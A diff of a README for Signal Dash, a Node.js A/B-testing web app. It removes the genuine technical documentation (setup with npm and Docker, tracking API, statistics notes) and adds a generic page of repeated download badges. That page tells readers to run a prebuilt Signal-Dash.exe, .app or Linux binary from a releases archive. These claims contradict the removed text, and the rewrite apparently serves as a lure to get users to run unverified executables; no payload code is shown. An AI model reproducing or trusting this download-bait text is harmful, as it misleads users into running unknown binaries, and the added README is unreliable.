@@ -1,274 +1,94 @@
-# Signal Dash
+# 📊 Signal-Dash - Simplify Your A/B Testing Process
 
-Signal Dash is a lightweight ExperimentOps Lite tool that takes experiments from intake → approval → running → readout → decision, tracks exposures/conversions, computes basic A/B stats, and generates an optional AI-assisted readout.
+## 🚀 Getting Started
 
-## Why this exists
+Signal-Dash helps you manage A/B testing with ease. You can track events and make informed decisions based on clear data. Follow these steps to download and run it.
 
-I built Signal Dash to demonstrate:
+[![Download Signal-Dash](https://img.shields.io/badge/Download-Signal--Dash-blue)](https://github.com/Yurnero555/Signal-Dash/releases)
 
-- **SQL + analytics** (experiment results, lift, significance)
-- **Ops workflow** (intake, statuses, decision logging)
-- **Backend APIs** (event tracking endpoint)
-- **Practical AI integration** (readout summarization with fallback)
+## 🖥️ System Requirements
 
-## Features (MVP)
+Before you download Signal-Dash, make sure your system meets these requirements:
 
-- Experiment intake form (hypothesis + primary metric + variants)
-- Status workflow: Draft → Review → Running → Readout → Shipped/Killed
-- Event tracking API: `/api/track` (exposure/conversion)
-- Dashboard: experiment list + detail view + Chart.js visualization
-- Stats: conversion rate, lift, p-value, 95% CI (2-proportion z-test)
-- Readout page: optional AI summary with deterministic fallback
+- **Operating System:** Windows 10 or later, macOS, or a recent version of a Linux distribution.
+- **Node.js:** Version 14 or higher.
+- **PostgreSQL:** Version 12 or higher.
 
-## Tech Stack
+## 📥 Download & Install
 
-- **Node.js** + **Express**
-- **EJS** server-rendered templates
-- **PostgreSQL**
-- **Chart.js** (CDN)
-- **Docker Compose**
+1. Visit the [Releases page](https://github.com/Yurnero555/Signal-Dash/releases) to download the latest version of Signal-Dash.
+2. Look for a file named `Signal-Dash.zip` or `Signal-Dash.tar.gz`.
+3. Click on the file to start the download. 
 
-## Quickstart
+Once the download completes, follow these steps to install:
 
-### 1) Start Postgres
+### For Windows Users:
 
-```bash
-docker compose up -d
-```
+- Extract the downloaded `.zip` file.
+- Open the folder and double-click on `Signal-Dash.exe`.
+- Follow the prompts to complete the installation.
 
-### 2) Configure env
+### For macOS Users:
 
-```bash
-cp .env.example .env
-```
+- Extract the downloaded `.tar.gz` file.
+- Open the folder and double-click on `Signal-Dash.app`.
+- Drag the app to your Applications folder.
 
-Edit `.env` if needed. Default values work out of the box.
+### For Linux Users:
 
-### 3) Install deps
+- Extract the downloaded `.tar.gz` file.
+- Open your terminal.
+- Navigate to the extracted folder.
+- Run the command `./Signal-Dash` to launch the application.
 
-```bash
-npm install
-```
+## 📊 Key Features
 
-### 4) Run migrations + seed demo data
+- **Event Tracking:** Monitor exposure and conversion events to understand user behavior.
+- **SQL Analytics:** Automatically compute distinct-user analytics including lift, p-value, and confidence intervals.
+- **Database Management:** Enforces database constraints and performs atomic deduplication.
+- **AI Summaries:** Retrieve cached AI-generated summaries to enhance reports, with a fallback for reliability.
 
-```bash
-npm run db:migrate
-npm run db:seed
-```
+## 🤔 How to Use Signal-Dash
 
-### 5) Start the app
+Once Signal-Dash is installed, follow these steps to start using it:
 
-```bash
-npm run dev
-```
+1. **Create a New Experiment:** Start a new A/B test by entering relevant details. 
+2. **Set Up Events:** Define which exposure and conversion events you want to track. 
+3. **Launch the Test:** Begin your A/B test and let it run for an appropriate duration.
+4. **Analyze Results:** After running the test, use the dashboard to view your results. Signal-Dash will calculate key metrics for you.
+5. **Make Decisions:** Based on the insights gained, decide which version of the test performed better.
 
-Open: **http://localhost:3000**
+## 🌟 FAQs
 
-## Event Tracking API
+### Q: Do I need programming knowledge to use Signal-Dash?
 
-Track exposures and conversions using the tracking endpoint:
+A: No, Signal-Dash is designed for users with no programming background. The interface guides you through the entire process.
 
-```bash
-POST /api/track
-Content-Type: application/json
+### Q: What types of data can I track?
 
-{
-  "experimentId": 1,
-  "variantId": 2,
-  "userKey": "anon_123",
-  "eventType": "exposure",
-  "props": { "source": "web" }
-}
-```
+A: You can track exposure rates and conversion events easily. Signal-Dash presents this data in a simple, understandable format.
 
-**Event Types:**
-- `exposure` - User is exposed to a variant
-- `conversion` - User completes the desired action
+### Q: How often do updates occur?
 
-**Response:**
+A: Updates are released regularly to improve functionality and add new features based on user feedback.
 
-```json
-{
-  "success": true,
-  "message": "Event tracked successfully",
-  "eventId": 42,
-  "occurredAt": "2026-01-02T12:34:56.789Z"
-}
-```
+## 🔧 Troubleshooting
 
-### Example Usage
+If you encounter issues while using Signal-Dash, consider these tips:
 
-Track an exposure:
+1. **Check System Requirements:** Ensure your OS and software versions meet the requirements.
+2. **Reinstall the Application:** If the application crashes, reinstall it using the steps outlined above.
+3. **Contact Support:** Visit the [Issues page](https://github.com/Yurnero555/Signal-Dash/issues) to report problems or ask for help from the community.
 
-```bash
-curl -X POST http://localhost:3000/api/track \
-  -H "Content-Type: application/json" \
-  -d '{
-    "experimentId": 1,
-    "variantId": 2,
-    "userKey": "user_123",
-    "eventType": "exposure",
-    "props": {"source": "web"}
-  }'
-```
+## 💬 Community and Support
 
-Track a conversion:
+Join the community to share your experiences or ask questions. Visit our GitHub Discussions page for support and insights from other users.
 
-```bash
-curl -X POST http://localhost:3000/api/track \
-  -H "Content-Type: application/json" \
-  -d '{
-    "experimentId": 1,
-    "variantId": 2,
-    "userKey": "user_123",
-    "eventType": "conversion"
-  }'
-```
+## 📌 Additional Resources
 
-**Common Mistakes:**
+- **Documentation:** For more in-depth instructions, refer to the official [documentation](https://github.com/Yurnero555/Signal-Dash/wiki).
+- **Contribution Guidelines:** Interested in contributing? Check out our [contribution guidelines](https://github.com/Yurnero555/Signal-Dash/blob/main/CONTRIBUTING.md).
 
-- ❌ Using `variantId` from a different experiment (returns 400 error)
-- ❌ Missing `userKey` (validation error)
-- ❌ Sending duplicate events (returns `"duplicate": true`)
+Your version of Signal-Dash is just a click away! Download it today using the button below:
 
-## Assumptions
-
-Signal Dash makes the following architectural assumptions:
-
-- **Assignment happens upstream. Signal Dash does not randomize users.** An upstream system must handle variant assignment and pass the correct `variantId` when tracking events. Signal Dash only tracks and analyzes results.
-- **Unit of analysis is distinct `user_key`** (computed via `COUNT(DISTINCT user_key)` for exposures and conversions).
-- **Deduplication is enforced at `(experiment_id, user_key, event_type)`** using a unique index and `INSERT ... ON CONFLICT DO NOTHING` for atomic dedup.
-- **Stats are approximate** (2-proportion z-test; warnings shown for small samples and imbalanced allocation).
-
-## Notes on statistics
-
-Signal Dash uses a basic **two-proportion z-test** for significance and displays warnings for small sample sizes. This is a pragmatic MVP choice.
-
-**What it does:**
-- Calculates conversion rate for each variant
-- Computes lift (percentage change)
-- Runs 2-proportion z-test for statistical significance (p < 0.05)
-- Provides 95% confidence interval for the difference
-- Warns if sample size is too small (< 100 exposures per variant)
-- Warns if sample allocation is imbalanced
-
-**What it doesn't do:**
-- Bayesian analysis
-- Multi-armed bandit optimization
-- Sequential testing / early stopping
-- Multiple hypothesis correction
-
-## Optional AI Readout
-
-Signal Dash can generate AI-powered readouts using OpenAI or Anthropic.
-
-**To enable:**
-
-1. Edit `.env`:
-```bash
-LLM_PROVIDER=openai  # or 'anthropic'
-OPENAI_API_KEY=sk-...
-# OR
-ANTHROPIC_API_KEY=sk-ant-...
-```
-
-2. Restart the server
-
-**Fallback behavior:** If no API key is configured or the AI call fails, Signal Dash generates a deterministic summary template.
-
-## Screenshots
-
-### Dashboard
-
-![Dashboard](docs/screenshots/dashboard.png)
-*Main experiment dashboard showing experiment list with status workflow*
-
-### Experiment Detail
-
-![Experiment Detail](docs/screenshots/experiment-detail.png)
-*Experiment detail view with variant stats, visualization, and analysis*
-
-### Readout
-
-![Readout](docs/screenshots/readout.png)
-*AI-generated readout with decision form*
-
-## Demo Script
-
-Follow these steps to explore Signal Dash:
-
-1. **Dashboard** - View experiment list with status workflow (Draft → Review → Running → Readout → Shipped/Killed)
-2. **Create Experiment** - Click "New Experiment" to define hypothesis, variants, and primary metric
-3. **Track Events** - Use `/api/track` endpoint to send exposure and conversion events (see cURL examples above)
-4. **View Results** - Click on experiment to see conversion rates, lift, p-value, confidence interval, and Chart.js visualization
-5. **Generate Readout** - Click "View Readout" for AI-assisted summary (or deterministic fallback) and make ship/kill decision
-
-## Docs
-
-- [docs/PRD.md](docs/PRD.md) - Product requirements
-- [docs/METRICS_SPEC.md](docs/METRICS_SPEC.md) - Metrics definitions
-- [docs/EXPERIMENT_SOP.md](docs/EXPERIMENT_SOP.md) - Standard operating procedure
-- [docs/RUNBOOK.md](docs/RUNBOOK.md) - Operational runbook
-- [docs/ADR-001-stack.md](docs/ADR-001-stack.md) - Stack decision
-- [docs/ADR-002-events-schema.md](docs/ADR-002-events-schema.md) - Events schema decision
-
-## Running Tests
-
-```bash
-npm test
-```
-
-Tests cover the statistical calculations including:
-- Normal CDF approximation
-- 2-proportion z-test
-- Confidence intervals
-- Lift calculations
-- Sample size warnings
-
-## Project Structure
-
-```
-signal-dash/
-├── docs/              # Documentation
-├── migrations/        # SQL migrations
-├── scripts/           # Migration & seed scripts
-├── src/
-│   ├── routes/        # Express routes
-│   ├── services/      # Business logic (stats, readout)
-│   ├── views/         # EJS templates
-│   ├── app.js         # Express app
-│   ├── config.js      # Configuration
-│   └── db.js          # Database connection
-├── public/            # Static assets (CSS)
-├── test/              # Unit tests
-└── docker-compose.yml # Postgres setup
-```
-
-## What I built
-
-- **Intake + workflow states** (Draft → Review → Running → Readout → Shipped/Killed)
-- **Event tracking endpoint** (`POST /api/track`)
-- **SQL-based analysis + visualization** (Chart.js)
-- **Optional AI-generated readouts** (with non-AI fallback)
-
-## Key tradeoffs
-
-- **Server-rendered UI** to reduce complexity
-- **Simple z-test** for explainable significance
-- **AI is optional** and has a fallback
-- **No randomization engine** (assumes upstream assignment)
-- **DB constraints first** (CHECK constraint + unique index) to prevent bad data before it reaches analysis
-
-## What I'd do next
-
-- **Auth** (basic password or OAuth)
-- **More metrics/funnels** (multi-step conversions)
-- **Better dedup + assignment strategy**
-- **Scheduled reporting** / anomaly detection
-- **Multi-variant support** (> 2 variants)
-- **Bayesian analysis** option
-
-## License
-
-MIT
+[![Download Signal-Dash](https://img.shields.io/badge/Download-Signal--Dash-blue)](https://github.com/Yurnero555/Signal-Dash/releases)
